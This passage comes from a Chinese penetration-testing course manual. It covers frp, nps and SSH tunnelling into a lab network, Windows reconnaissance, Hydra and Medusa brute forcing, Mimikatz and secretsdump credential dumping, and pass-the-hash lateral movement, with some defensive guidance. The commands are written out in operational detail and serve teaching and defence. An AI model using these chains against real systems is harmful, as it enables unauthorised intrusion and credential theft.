proxychains nmap -sT -p 21,80,135,139,445,3389,5985 127.0.0.1

# 预期输出：
# PORT     STATE  SERVICE
# 80/tcp   open   http
# 135/tcp  open   msrpc
# 139/tcp  open   netbios-ssn
# 445/tcp  open   microsoft-ds
# 3389/tcp open   ms-wbt-server
# 5985/tcp open   wsman
```

> 💡 **proxychains 的工作原理**：
> - proxychains 拦截程序的网络连接请求
> - 将请求通过 SOCKS5 代理（frp 隧道）转发
> - frp 服务端（ECS）收到请求后，通过隧道转发给 frp 客户端（SRV02）
> - frp 客户端的 socks5 插件在 SRV02 本地发起连接
> - **最终效果**：Kali 上的工具"以为"自己在 SRV02 的本地网络中运行

**第四步：模拟多主机场景（扩展）**

> 💡 **真实内网场景**：在实际渗透测试中，SRV02 通常处于一个包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可以扫描整个内网网段，发现更多目标。
>
> 如果学生有条件，可以在 VMware 中额外创建一台虚拟机 SRV03（192.168.100.40），与 SRV02 处于同一内网。然后通过 SOCKS5 代理从 Kali 扫描 SRV03：

```bash
# 如果存在内网网段 192.168.100.0/24
proxychains nmap -sn 192.168.100.0/24
# 预期：发现 SRV02（192.168.100.30）和 SRV03（192.168.100.40）

# 扫描 SRV03 的端口
proxychains nmap -sT -sV -p 80,3389,445 192.168.100.30
```

> ⚠️ **proxychains 下的 nmap 限制**：
> - 只能使用 `-sT`（TCP Connect）扫描，不能使用 `-sS`（SYN扫描，需要原始套接字）
> - 不能使用 ICMP ping（`-sn` 可能不准确），建议使用 `-Pn` 跳过主机发现
> - 速度较慢（每个数据包经过多层代理），扫描大网段需要耐心等待

**第五步：使用浏览器通过SOCKS5代理访问**

```text
Firefox 设置方法：
1. 打开 Firefox → 设置 → 常规 → 网络设置 → 设置
2. 选择"手动代理配置"
3. SOCKS 主机：<ECS公网IP>    端口：10080
4. 选择 SOCKS v5
5. 勾选"代理 DNS 时使用 SOCKS v5"
6. 确定

访问 http://127.0.0.1
预期：显示 SRV02 的 IIS 页面
```

> 💡 **教学意义**：SOCKS5 代理是 frp 最强大的功能之一——一条隧道即可访问目标主机所在网段的所有服务。配合 proxychains，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作，就像直接在内网中一样。这正是攻击者突破单台主机后扩展战果的核心手段。

---

### 实验5：nps内网穿透（Web管理界面）

> ⚠️ **前置条件**：完成实验1-3。本实验演示 nps 的 Web 管理界面操作，适合作为 frp 的补充对比学习。
>
> **实验场景**：在阿里云 ECS 上部署 nps 服务端（提供 Web 管理界面），在 SRV02（本地虚拟机）上运行 nps 客户端。通过 Web 界面可视化管理隧道配置。

**第一步：在ECS上安装nps服务端**

```bash
# 在阿里云 ECS 上执行

# 从 GitHub 下载 nps 最新版本
# 访问 https://github.com/ehang-io/nps/releases 获取最新版本

cd /opt
sudo wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
sudo mkdir nps && sudo tar -xzf linux_amd64_server.tar.gz -C nps
cd nps

# 查看文件结构
ls -la
# 预期文件：
# nps         —— 服务端可执行文件
# conf/nps.conf —— 服务端配置文件
# web/        —— Web管理界面资源目录
```

**第二步：配置nps服务端**

```bash
# 编辑 nps 配置文件
sudo nano /opt/nps/conf/nps.conf
```

修改以下关键配置：

```ini
# nps.conf 关键配置项

# Web管理界面端口
web_port=8080
# Web管理界面用户名/密码
web_username=admin
web_password=admin123

# 客户端连接端口（与frp类似，客户端通过此端口连接服务端）
bridge_port=8024
# 桥接协议类型
bridge_type=tcp

# 公钥和私钥（默认已生成，如缺失可手动创建）
# public_key=keys/public.pem
# private_key=keys/private_key.pem
```

> ⚠️ **安全组提醒**：确保阿里云安全组已放行 8080（Web管理）和 8024（客户端连接）端口。

**第三步：启动nps服务端**

```bash
# 启动 nps
sudo /opt/nps/nps

# 预期输出：
# the version of server is x.x.x, core version x.x.x
# nps start successfully
```

```bash
# 验证 nps 已启动
ss -tlnp | grep -E "8080|8024"
# 预期：
# LISTEN  0  128  :::8080   :::*    (Web管理界面)
# LISTEN  0  128  :::8024   :::*    (客户端连接端口)
```

**第四步：通过Web界面添加客户端**

1. 在本地浏览器中访问：`http://<ECS公网IP>:8080`
2. 输入用户名 `admin`，密码 `admin123` 登录
3. 左侧菜单选择 **客户端** → 点击 **新增**
4. 填写客户端信息：
   - 客户端备注名：`SRV02-Internal`
   - 基本验证密钥：`npstest2025`（客户端连接时使用）
   - 其他保持默认
5. 点击 **保存**
6. 保存后会显示 **客户端ID**（如 `1`）和 **客户端命令**（客户端连接命令）

> ⚠️ **预期结果**：客户端列表中出现刚添加的 SRV02-Internal 客户端，状态为"离线"（因为客户端还没启动）。

**第五步：在Web界面添加隧道**

1. 在客户端列表中，点击 SRV02-Internal 旁边的 **隧道** 按钮
2. 点击 **新增**，添加 **TCP隧道**：
   - 隧道类型：`TCP`
   - 备注：`RDP-映射`
   - 服务端端口：`10001`
   - 目标（内网地址:端口）：`127.0.0.1:3389`
   - 客户端：`SRV02-Internal`
3. 再新增一个 **Web隧道**：
   - 隧道类型：`HTTP`
   - 备注：`Web-映射`
   - 服务端端口：`10002`
   - 目标：`127.0.0.1:80`

**第六步：在SRV02上安装nps客户端**

```powershell
# 在 SRV02 上执行

# 从 GitHub 下载 Windows 版客户端
Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
# 使用 7-Zip 解压（tar.gz 格式）
```

```powershell
# 在 SRV02 上启动 npc
C:\npc\npc.exe -server=<ECS公网IP>:8024 -vkey=npstest2025

# 预期输出：
# npc start successfully
```

> ⚠️ **预期结果**：nps 客户端成功连接到服务端。在浏览器的 nps Web 管理界面中刷新客户端列表，SRV02-Internal 的状态应变为"在线"。

**第七步：验证nps隧道**

```bash
# 在本地电脑或 Kali 上测试
# 测试 RDP 隧道
nmap -p 10001 <ECS公网IP>
# 预期：10001/tcp open

# 测试 Web 隧道
curl http://<ECS公网IP>:10002
# 预期：返回 SRV02 的 Web 页面
```

> 💡 **nps vs frp 对比**：
> - **nps** 优势：Web 管理界面直观，适合新手操作；隧道管理集中化
> - **frp** 优势：性能更高，配置更灵活，社区更活跃，TOML 配置语法更现代
> - **课堂建议**：以 frp 为主要教学工具，nps 作为补充演示

---

### 实验6：SSH隧道内网穿透

> SSH 隧道是最简单的内网穿透方式，无需安装额外工具，只需 SSH 客户端和服务端即可。
>
> **实验场景**：在阿里云 ECS 上启用 SSH 服务（Ubuntu 默认已启用），从 Kali 或本地电脑通过 SSH 隧道将 SRV02 的内网服务转发到本地。

**原理**：

```
SSH隧道类型：

1. 远程端口转发（-R）—— 最适合内网穿透场景：
   ECS:REMOTE_PORT ◄──SSH── SRV02:22 ──← SRV02 主动连接 ECS
   SRV02 将自己的端口暴露到 ECS 的公网 IP 上

2. 本地端口转发（-L）：
   Kali:LOCAL_PORT ──SSH──► ECS:22 ──→ ECS 可达的其他服务
   将远程端口映射到本地

3. 动态端口转发（-D）：
   Kali:LOCAL_PORT ──SSH──► ECS:22 ──→ 整个网络
   创建SOCKS5代理
```

**第一步：确认ECS上SSH服务已启用**

```bash
# 在 ECS 上执行（Ubuntu 默认已安装并启用 SSH）
sudo systemctl status sshd
# 预期：active (running)

# 如果未启用，安装并启动：
sudo apt install -y openssh-server
sudo systemctl enable --now sshd
```

> 💡 **阿里云 ECS 的 SSH 服务**：Ubuntu 镜像默认已安装 OpenSSH Server，且安全组在实验1中已放行 22 端口，无需额外配置。

**第二步：远程端口转发（SRV02 将 RDP 暴露到 ECS）**

远程端口转发是内网穿透的经典场景——内网主机（SRV02）主动 SSH 连接到公网服务器（ECS），将自己的端口暴露出去。

```powershell
# 在 SRV02（本地虚拟机）上执行
# SRV02 通过 SSH 连接到 ECS，将本地 RDP(3389) 暴露到 ECS 的 13389 端口

ssh -R 13389:127.0.0.1:3389 root@<ECS公网IP> -N -f

# 参数说明：
# -R 13389:127.0.0.1:3389   远程端口转发：ECS:13389 → SRV02:3389
# -N  不执行远程命令（仅转发）
# -f  后台运行

# 验证隧道是否建立成功
# 在 SRV02 上应看到 SSH 连接已建立
netstat -an | findstr ":22"
```

```bash
# 在 Kali 或本地电脑上验证
# 通过 ECS 的 13389 端口连接 SRV02 的 RDP
nmap -p 13389 <ECS公网IP>
# 预期：13389/tcp open

xfreerdp /v:<ECS公网IP> /port:13389 /u:administrator /p:'P@ssw0rd' /cert:ignore
# 预期：成功连接到 SRV02 的远程桌面
```

> ⚠️ **安全组提醒**：确保 ECS 安全组已放行 13389 端口的入站 TCP 流量。

**第三步：动态端口转发（SOCKS5代理）**

```bash
# 在 Kali 或本地电脑上执行
# 通过 ECS 创建 SOCKS5 代理

ssh -D 1080 root@<ECS公网IP> -N -f

# 参数说明：
# -D 1080   在本地1080端口创建SOCKS5代理

# 使用 proxychains 通过 SOCKS5 代理访问服务
# 确保 /etc/proxychains4.conf 中配置了：
# [ProxyList]
# socks5 127.0.0.1 1080

# 如果 SRV02 已通过 frp 或 SSH 隧道暴露了端口，可通过代理访问
proxychains curl http://127.0.0.1:10002
# 预期：返回 SRV02 的 Web 页面
```

> 💡 **SSH 隧道 vs frp 对比**：
> - SSH 隧道不需要额外安装工具，但需要 ECS 开放 SSH 服务
> - frp 适用范围更广，支持更多协议和功能（Dashboard、健康检查等）
> - SSH 远程端口转发（-R）等效于 frp 的 TCP 隧道功能
> - SSH 动态端口转发（-D）等效于 frp 的 SOCKS5 代理功能
> - **frp 更适合持久化的内网穿透**（可注册为服务、支持断线重连），SSH 隧道更适合临时使用

---

## 📝 任务二知识点总结

| 知识点 | 要点 |
| --- | --- |
| 内网穿透原理 | 内网主机主动连接公网服务器建立隧道，外部通过隧道反向访问内网 |
| 正向代理 vs 反向代理 | 正向代理代理客户端，反向代理代理服务器；内网穿透属于反向代理 |
| frp架构 | frps（服务端）+ frpc（客户端），通过控制隧道和数据隧道分离实现高效转发 |
| frp配置（TOML） | 服务端：bindPort/auth/webServer；客户端：serverAddr/proxies |
| frp隧道类型 | TCP（端口映射）、HTTP/HTTPS（域名代理）、SOCKS5（全网段代理） |
| nps工具 | 提供Web管理界面，通过浏览器配置隧道，适合新手操作 |
| SSH隧道 | -L本地转发、-R远程转发、-D动态转发（SOCKS5代理） |
| 防御要点 | 监控出站连接、限制出站流量、部署IDS检测隧道流量模式 |

---

# 任务三 内网信息收集

## 🧠 理论知识

### 内网信息收集概述

内网信息收集是渗透测试的关键阶段。攻击者在获取内网初始访问后，需要全面了解网络拓扑、主机信息、用户账户、共享资源等，才能规划后续的横向移动路径。

**信息收集的层次**：

```
内网信息收集的层次结构：

第一层：本机信息
├── 网络配置（IP、网关、DNS）
├── 系统信息（OS版本、补丁、架构）
├── 用户和组信息
├── 进程和服务
└── 安全软件和防护状态

第二层：网络邻居
├── ARP缓存（同网段主机）
├── NetBIOS广播（NetBIOS名称表）
├── 网络共享资源
└── 域信息（域控、域用户）

第三层：主动扫描
├── Nmap端口扫描
├── 服务版本探测
├── 漏洞扫描
└── 协议枚举（SMB/LDAP/Kerberos）
```

### 常用信息收集命令

**本机网络信息**：

| 命令 | 用途 | 输出关键信息 |
| --- | --- | --- |
| `ipconfig /all` | 完整网络配置 | IP、子网掩码、网关、DNS、DHCP |
| `netstat -an` | 网络连接状态 | 活跃连接、监听端口 |
| `arp -a` | ARP缓存表 | 同网段已通信主机的MAC地址 |
| `route print` | 路由表 | 网络路由规则（发现多网段） |
| `nslookup` | DNS查询 | DNS服务器、域名解析 |

**用户和组信息**：

| 命令 | 用途 |
| --- | --- |
| `whoami /all` | 当前用户权限、组成员、令牌信息 |
| `net user` | 本地用户列表 |
| `net localgroup administrators` | 管理员组成员 |
| `net group "domain admins" /domain` | 域管理员列表（域环境） |
| `net group "domain controllers" /domain` | 域控制器列表 |

**系统和服务信息**：

| 命令 | 用途 |
| --- | --- |
| `systeminfo` | 操作系统版本、补丁列表、架构 |
| `hostname` | 计算机名称 |
| `tasklist /svc` | 进程及对应服务 |
| `net share` | 本机共享资源 |
| `net view` | 网络上的计算机 |
| `wmic qfe` | 已安装的补丁列表 |

---

## 🛠️ 实践操作

### 实验7：Windows内网信息收集（在SRV02上执行）

> ⚠️ **前置条件**：完成实验1-3，frp 隧道已建立。本实验在 SRV02 上执行，模拟攻击者获取内网主机权限后的信息收集。
>
> **操作方式**：本实验同时提供**图形界面**和**命令行**两种操作方式。

**第一步：本机网络信息收集**

```powershell
# 在 SRV02 上以管理员身份运行 PowerShell

# 1. 查看完整网络配置
ipconfig /all
# 关键信息：
# - IPv4 地址：取决于VMware网络配置
# - 默认网关：取决于VMware NAT网关地址
# - DNS 服务器：取决于网络配置

# 2. 查看路由表
route print
# 关键信息：发现网关负责转发非本地流量
# 攻击者可推断：本地网段范围，是否存在多网段

# 3. 查看 ARP 缓存（发现同网段主机）
arp -a
# 预期输出：
# Interface: <SRV02的IP地址>
#   Internet Address    Physical Address    Type
#   <网关IP>            xx-xx-xx-xx-xx-xx   dynamic  ← 网关/其他主机
#   <广播地址>          ff-ff-ff-ff-ff-ff   static

# 4. 查看活跃网络连接
netstat -an | findstr "ESTABLISHED"
# 关键信息：发现已建立的连接，可推断正在通信的主机

# 5. 查看 DNS 缓存
ipconfig /displaydns | findstr "Record"
# 关键信息：DNS 缓存可泄露最近访问过的域名
```

**图形界面方式**：
1. 按 `Win+R`，输入 `ncpa.cpl`，回车打开"网络连接"
2. 右键活动的网卡 → **状态** → **详细信息**，可查看 IP、网关、DNS 等完整信息
3. 按 `Win+R`，输入 `cmd`，在命令行中输入 `arp -a` 查看 ARP 缓存

**第二步：用户、组和系统信息收集**

```powershell
# 在 SRV02 上继续执行

# 1. 当前用户信息
whoami
# 预期：desktop-xxx\administrator 或 corp\xxx

whoami /all
# 关键信息：
# - 用户 SID
# - 组成员（重点关注 Administrators、Domain Admins 等高权限组）
# - 特权信息（SeDebugPrivilege、SeImpersonatePrivilege 等）

# 2. 本地用户列表
net user
# 预期：列出所有本地用户账户

# 3. 本地管理员组成员
net localgroup administrators
# 关键信息：发现哪些账户拥有本地管理员权限

# 4. 系统信息
systeminfo
# 关键信息：
# - OS 名称和版本
# - 系统启动时间
# - 已安装的修补程序（补丁列表）
# - 网卡信息

# 5. 已安装补丁
wmic qfe list full
# 攻击者用途：检查是否有未修复的已知漏洞

# 6. 计算机名和域名
hostname
echo %USERDOMAIN%
```

**第三步：网络邻居和共享资源收集**

```powershell
# 在 SRV02 上继续执行

# 1. 查看网络上的计算机（NetBIOS广播）
net view
# 预期：列出同网段可发现的计算机（如网关、其他主机）

# 2. 查看域信息（如果加入了域）
net view /domain
# 如果是域环境，会列出域名称

# 3. 查看本机共享资源
net share
# 预期：列出 C$、ADMIN$、IPC$ 等默认共享和自定义共享

# 4. 查看远程主机的共享（如果有其他内网主机）
net view \\<其他主机IP>
# 预期：列出远程主机上可访问的共享资源

# 5. 查看本机运行的服务
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType
# 关键信息：发现运行的服务（如 IIS、WinRM、SSH、SQL Server 等）

# 6. 查看进程列表
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
# 关键信息：发现安全软件进程（如 MsMpEng.exe = Windows Defender）
```

---

### 实验8：Nmap内网扫描（通过frp隧道从Kali执行）

> ⚠️ **前置条件**：完成实验1-3（frp隧道已建立），SOCKS5代理可用（`<ECS公网IP>:10080`）。
>
> **实验场景**：Kali 通过 frp SOCKS5 代理扫描 SRV02 本地网络中的服务。SOCKS5 代理从 SRV02 本地发起连接，因此可以访问 SRV02 所在网络中的其他主机。

**第一步：配置proxychains**

```bash
# 在 Kali 上编辑 proxychains 配置
sudo nano /etc/proxychains4.conf

# 确保文件末尾有以下配置：
# [ProxyList]
# socks5 <ECS公网IP> 10080

# 注意：如果之前配置过 proxychains，先删除旧的代理配置行
```

**第二步：主机发现**

```bash
# 通过 SOCKS5 代理扫描 SRV02 本地网络
# SOCKS5 代理从 SRV02 本地发起连接，127.0.0.1 即 SRV02 自身
proxychains nmap -sn 127.0.0.1

# 如果 SRV02 处于 VMware NAT 网段中，可扫描该网段发现其他主机
# 替换为实际的 VMware 网段地址
proxychains nmap -sn <VMware网段>/24

# 预期输出：
# Nmap scan report for 127.0.0.1
# Host is up (0.xxxs latency).

# 注意：proxychains 下的 nmap 会比较慢（流量经过多层转发），请耐心等待
```

> ⚠️ **预期结果**：通过 SOCKS5 代理可以扫描到 SRV02 自身及同一网段中的其他主机。如果 SRV02 处于 VMware NAT 网段中，可能发现 VMware NAT 网关和其他虚拟机。

**第三步：端口扫描与服务识别**

```bash
# 扫描 SRV02 的关键端口（SOCKS5代理从SRV02本地发起连接，127.0.0.1即SRV02）
proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 127.0.0.1

# 预期输出示例：
# PORT     STATE  SERVICE
# 80/tcp   open   http
# 135/tcp  open   msrpc
# 139/tcp  open   netbios-ssn
# 445/tcp  open   microsoft-ds
# 3389/tcp open   ms-wbt-server
# 5985/tcp open   wsman

# 服务版本探测
proxychains nmap -sT -sV -p 80,445,3389,5985 127.0.0.1

# 操作系统探测
proxychains nmap -sT -O 127.0.0.1
```

> 💡 **proxychains 下的 nmap 限制**：
> - 只能使用 `-sT`（TCP Connect）扫描，不能使用 `-sS`（SYN扫描，需要原始套接字）
> - 不能使用 ICMP ping（`-sn` 可能不准确），建议使用 `-Pn` 跳过主机发现
> - 速度较慢（每个数据包经过多层代理），扫描大网段需要较长时间

**第四步：SMB漏洞扫描**

```bash
# 扫描 SMB 相关漏洞
proxychains nmap -sT --script smb-vuln* -p 445 127.0.0.1

# 扫描 SMB 共享和用户
proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
```

**第五步：通过frp直接扫描（不使用proxychains）**

由于 frp 已映射了 SRV02 的特定端口，也可以直接扫描 frps 的映射端口：

```bash
# 直接扫描 Kali 本机的 frp 映射端口（更快、更稳定）
nmap -sV -p 10001,10002,10003,10004 127.0.0.1

# 预期输出：
# PORT     STATE SERVICE    VERSION
# 10001/tcp open  ssl/wbt-server?
# 10002/tcp open  http       Microsoft IIS httpd 10.0
# 10003/tcp open  http       Microsoft HTTPAPI httpd 2.0
# 10004/tcp open  netbios-ssn?

# 这种方式更快，因为数据不需要经过SOCKS5代理的额外开销
```

---

## 📝 任务三知识点总结

| 知识点 | 要点 |
| --- | --- |
| 信息收集层次 | 本机信息→网络邻居→主动扫描，由近及远逐步扩展 |
| 本机网络信息 | `ipconfig /all`、`arp -a`、`route print`、`netstat -an` |
| 用户组信息 | `whoami /all`、`net user`、`net localgroup administrators` |
| 共享资源枚举 | `net share`（本机）、`net view \\主机`（远程主机） |
| proxychains限制 | 只能用-sT扫描，速度慢，无法使用ICMP和SYN扫描 |
| Nmap通过隧道扫描 | SOCKS5代理+proxychains实现跨网段扫描 |
| 攻击者视角 | 信息收集的目的是发现可攻击的面和横向移动的路径 |

---

# 任务四 内网渗透实战

## 🧠 理论知识

### 网络攻击一般流程

**经典攻击流程**（也称网络杀伤链 Cyber Kill Chain）：

| 阶段 | 说明 | 对应MITRE ATT&CK |
| --- | --- | --- |
| **踩点（Reconnaissance）** | 收集目标信息（IP、域名、员工信息等） | TA0043 侦察 |
| **扫描（Scanning）** | 扫描开放端口、服务版本、漏洞 | TA0007 发现 |
| **查点（Enumeration）** | 枚举用户、共享、服务详情 | TA0007 发现 |
| **实施入侵（Exploitation）** | 利用漏洞或弱口令获取初始访问 | TA0001 初始访问 |
| **获取权限** | 建立稳定的访问通道 | TA0002 执行 |
| **提升权限** | 从普通用户提升为管理员/SYSTEM | TA0004 权限提升 |
| **掩盖踪迹** | 清理日志、删除工具痕迹 | TA0005 防御规避 |
| **植入后门** | 安装持久化后门保持访问 | TA0003 持久化 |

---

### Pass-the-Hash（哈希传递攻击）

**Pass-the-Hash（PtH）** 是内网横向移动最常用的技术之一。攻击者无需知道明文密码，仅凭 NTLM 哈希即可完成身份认证。

```
Pass-the-Hash 原理：

正常的密码认证：
  用户输入密码 → 系统计算NTLM Hash → 与SAM中存储的Hash比对 → 认证成功

Pass-the-Hash攻击：
  攻击者已获取目标用户的NTLM Hash
       ↓
  攻击者直接用Hash构造NTLM认证请求
       ↓
  目标服务器用存储的Hash比对 → 匹配 → 认证成功！
       ↓
  攻击者无需知道明文密码即可登录

根本原因：NTLM认证协议不验证"是否知道密码"
          只验证"是否拥有正确的Hash"
          → Hash在认证中与密码等价！
```

### 横向移动常用工具

| 工具 | 协议 | 所需权限 | 特点 |
| --- | --- | --- | --- |
| **impacket-psexec / psexec.py** | SMB(445) | 管理员凭据 | 通过SMB上传服务并执行，返回SYSTEM权限Shell |
| **impacket-wmiexec / wmiexec.py** | WMI(135) | 管理员凭据 | 通过WMI远程执行命令，无文件落地 |
| **impacket-smbexec / smbexec.py** | SMB(445) | 管理员凭据 | 通过SMB服务执行命令，不留日志 |
| **evil-winrm** | WinRM(5985) | 管理员凭据 | 基于WinRM的交互式Shell，支持文件传输 |
| **NetExec（nxc / netexec）** | SMB/LDAP/WinRM | 凭据 | CrackMapExec 的延续版本，适合批量验证、枚举和远程执行 |
| **impacket-atexec / atexec.py** | SMB+TaskSched | 管理员凭据 | 通过计划任务远程执行命令 |

---

## 🛠️ 实践操作

### 实验9：弱口令攻击（通过frp隧道）

> ⚠️ **前置条件**：frp隧道已建立，RDP映射端口10001可用。本实验需提前在SRV02上启用RDP并创建弱口令账户。
>
> **前置准备——在SRV02上创建弱口令靶标账户**：

```powershell
# 在 SRV02 上以管理员身份运行

# 创建弱口令用户（用于暴力破解实验）
net user testuser P@ssw0rd /add
net user admin123 123456 /add
net localgroup administrators admin123 /add

# 确保 RDP 已启用
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**第一步：使用Hydra进行RDP暴力破解**

```bash
# 在 Kali 上执行

# 创建密码字典
cat > /tmp/users.txt << 'EOF'
administrator
testuser
admin123
EOF

cat > /tmp/passwords.txt << 'EOF'
123456
password
P@ssw0rd
admin
admin123
qwerty
EOF

# 使用 Hydra 通过 frp 映射端口暴力破解 RDP
hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4

# 预期输出示例：
# [3389][rdp] host: <ECS公网IP>   login: admin123   password: 123456
# [3389][rdp] host: <ECS公网IP>   login: testuser   password: P@ssw0rd
```

> ⚠️ **预期结果**：Hydra 成功破解出 `admin123:123456` 和 `testuser:P@ssw0rd` 两组弱口令。如果超时或连接失败，增加 `-w 10` 参数延长超时时间（frp 隧道有额外延迟）。

**第二步：使用Medusa进行SMB密码喷洒**

```bash
# 使用 Medusa 通过 frp SMB 映射进行密码喷洒
medusa -h <ECS公网IP> -u administrator -P /tmp/passwords.txt -M smbnt -n 10004

# 预期输出：如果 administrator 的密码在字典中，会显示 SUCCESS
```

---

### 实验10：Pass-the-Hash横向移动

> ⚠️ **前置条件**：已获取 SRV02 的管理员凭据（来自实验9的暴力破解，或已知弱口令）。需要安装 Impacket 工具集。
>
> **Impacket 安装**：

```bash
# 在 Kali 2025.04 上优先使用系统包（通常已预装）
sudo apt update
sudo apt install -y impacket-scripts python3-impacket netexec

# 验证命令是否可用
which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
```

**第一步：远程获取NTLM哈希**

```bash
# 在 Kali 上使用 Impacket secretsdump 获取哈希
# 推荐方式：通过 frp 的 SOCKS5 隧道访问 SRV02（127.0.0.1:445，因为 SOCKS5 代理从 SRV02 本地发起连接）
# 确认 /etc/proxychains4.conf 已配置：socks5 <ECS公网IP> 10080
proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1

# 说明：许多 Impacket 脚本依赖 SMB/RPC 默认端口和动态端口，不建议只依赖单个 10004 端口映射。
# 预期输出（部分）：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
# testuser:1001:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
# admin123:1002:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```

> 💡 **如果 secretsdump 无法直接通过映射端口连接**（某些 Impacket 脚本不支持自定义端口），可使用 NetExec（`nxc`）辅助验证 SMB 凭据，或通过 Evil-WinRM 的 `Invoke-Mimikatz` 在目标上直接执行。

**第二步：使用Evil-WinRM获取哈希（推荐方式）**

```bash
# 通过 frp WinRM 映射连接 SRV02
evil-winrm -i <ECS公网IP> -P 10003 -u administrator -p 'P@ssw0rd'

# 在 Evil-WinRM 会话中执行 Mimikatz 获取哈希
# 方法一：使用内置的 Invoke-Mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# 方法二：使用内置的下载和执行功能
# 下载 Mimikatz 到目标主机
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 记录输出中的 NTLM 哈希（格式如下）：
# Username : administrator
# Domain   : DESKTOP-XXXXX
# NTLM     : <NTLM_HASH值>
```

> ⚠️ **预期结果**：输出中包含各用户的 NTLM 哈希。复制 `Administrator` 的 NTLM 哈希用于后续 Pass-the-Hash 攻击。如果 Mimikatz 被 Windows Defender 拦截，需先关闭 Defender 实时防护。

**第三步：使用获取的哈希进行PtH攻击**

```bash
# 在 Kali 上使用获取的 NTLM 哈希进行 Pass-the-Hash

# 方法一：NetExec（nxc，批量操作）
# 通过 frp SMB 映射端口验证哈希有效性
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'

# 方法二：NetExec 使用 PtH 执行远程命令
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"

# 方法三：Impacket wmiexec（交互式Shell，推荐走 SOCKS5）
proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1

# 方法四：Impacket psexec（SYSTEM权限Shell，推荐走 SOCKS5）
proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
```

> 💡 **PtH 的教学意义**：PtH 攻击说明密码哈希在 Windows 认证体系中等价于明文密码。防御措施包括：将高权限账户加入 Protected Users 组（禁止 NTLM 认证）、启用 Credential Guard（虚拟化保护凭据）、部署 SMB 签名（防止哈希被中继）。

---

### 扩展：域环境渗透（详见实验六）

> 本任务的横向移动实验（实验9、实验10）聚焦于**工作组环境**下的凭据获取与 Pass-the-Hash。当目标网络为 **Active Directory 域环境**时，攻击者还可实施更高级的域级攻击——包括 Kerberoasting（离线破解服务账户密码）、DCSync（冒充域控复制导出全域哈希）、黄金票据伪造（持久化域管权限）以及 BloodHound 攻击路径分析。
>
> 这些内容已整合在独立实验 **《实验六：Windows域环境渗透与提权》** 中，包含从域信息收集→Kerberoasting→DCSync→BloodHound→加固验证的完整五阶段攻击链，预计用时 150 分钟。
>
> **本项目与实验六的衔接关系**：

| 项目八（本讲义） | 实验六（独立实验） | 衔接点 |
| --- | --- | --- |
| frp/nps内网穿透 → 建立到内网的隧道 | 域信息收集 → 识别域控、枚举用户和SPN | 隧道建立后的第一步就是信息收集 |
| 弱口令暴力破解 → 获取普通域用户凭据 | Kerberoasting → 从普通用户提权到服务账户 | 暴力破解获取的凭据可作为Kerberoasting的起点 |
| Pass-the-Hash → 工作组横向移动 | DCSync → 域级横向移动导出全域哈希 | PtH获取的域管哈希可直接用于DCSync |
| 安全加固（SMB签名、防火墙） | 域级加固（Protected Users、krbtgt重置、权限回收） | 项目八的网络层加固 + 实验六的身份层加固 = 完整防御体系 |

> 💡 **教学建议**：实验六适合在项目六（域管理）和项目八（内网安全）学完之后作为**综合实战**安排，将域管理和内网安全两部分知识融会贯通。学生在实验六中将体验从"普通域用户"到"全域控制"的完整攻击链，深刻理解"内网安全≠边界安全"。

## 📝 任务四知识点总结

| 知识点 | 要点 |
| --- | --- |
| 攻击流程 | 踩点→扫描→查点→入侵→提权→持久化→掩盖踪迹 |
| 弱口令攻击 | 使用 Hydra/Medusa 通过 frp 隧道对映射端口进行暴力破解 |
| Pass-the-Hash | 无需明文密码，仅凭 NTLM 哈希即可完成身份认证和横向移动 |
| Impacket 工具族 | psexec（SMB执行）、wmiexec（WMI执行）、secretsdump（哈希导出） |
| Evil-WinRM | 基于WinRM的交互式Shell工具，支持文件上传和哈希获取 |
| frp在渗透中的角色 | 将内网服务映射到公网，使Impacket/Hydra等工具可直接攻击内网主机 |
| 域级攻击（扩展） | Kerberoasting、DCSync、黄金票据等域级攻击详见《实验六：Windows域环境渗透与提权》 |

---

# 任务五 内网安全防御与加固

## 🧠 理论知识

### 内网安全纵深防御体系

```
内网纵深防御五层体系：

第一层：网络隔离（Network Segmentation）
├── 划分安全区域（DMZ/办公区/服务器区/核心区）
├── VLAN + 防火墙规则限制跨区域访问
└── 微分段（Micro-Segmentation）—— 每台服务器独立策略

第二层：身份安全（Identity Security）
├── 最小权限原则 —— 仅授予完成工作所需的最低权限
├── Protected Users组 —— 禁止高权限账户使用NTLM
├── Credential Guard —— 虚拟化保护凭据存储
└── 多因素认证（MFA）

第三层：端点安全（Endpoint Security）
├── EDR（端点检测与响应）
├── 应用白名单
├── 补丁管理
└── 主机防火墙

第四层：监控与检测（Monitoring & Detection）
├── SIEM（安全信息和事件管理）
├── IDS/IPS（入侵检测/防御系统）
├── 网络流量分析（NTA）
└── 用户行为分析（UEBA）

第五层：应急响应（Incident Response）
├── 应急响应预案
├── 取证与溯源能力
├── 快速隔离与恢复
└── 事后复盘与加固
```

### Tier管理模型

Microsoft 推荐的 AD 管理权限分层模型：

